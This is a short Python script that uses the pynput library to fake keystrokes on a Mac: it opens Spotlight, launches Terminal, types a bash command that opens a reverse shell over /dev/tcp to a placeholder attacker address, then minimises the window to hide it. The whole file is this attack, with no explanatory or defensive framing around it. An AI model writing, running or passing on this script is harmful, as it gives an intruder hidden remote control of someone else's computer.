from pynput.keyboard import Key, Controller
import time

keyboard = Controller()

time.sleep(5)

# Open Spotlight
with keyboard.pressed(Key.cmd):
    keyboard.press(Key.space)
    keyboard.release(Key.space)

time.sleep(1)

# Open the Terminal app from Spotlight
keyboard.type('Terminal.app')
time.sleep(1)
keyboard.press(Key.enter)
keyboard.release(Key.enter)

time.sleep(3)

# Open up a reverse shell to the attackers machine
keyboard.type("bash -i >& /dev/tcp/ATTACKER-IP/PORT 0>&1")
keyboard.press(Key.enter)
keyboard.release(Key.enter)

# Hide the teminal
with keyboard.pressed(Key.cmd):
    keyboard.press('m')
    keyboard.release('m')
